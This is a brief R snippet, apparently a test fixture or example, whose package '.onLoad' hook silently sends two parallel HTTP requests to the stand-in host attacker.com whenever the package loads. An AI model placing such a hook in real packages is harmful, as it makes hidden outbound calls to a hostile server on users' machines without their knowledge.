.onLoad = function(libname, pkgname) {
  reqs <- list(
    httr2::request("https://attacker.com/a"),
    httr2::request("https://attacker.com/b")
  )
  httr2::req_perform_parallel(reqs)
}
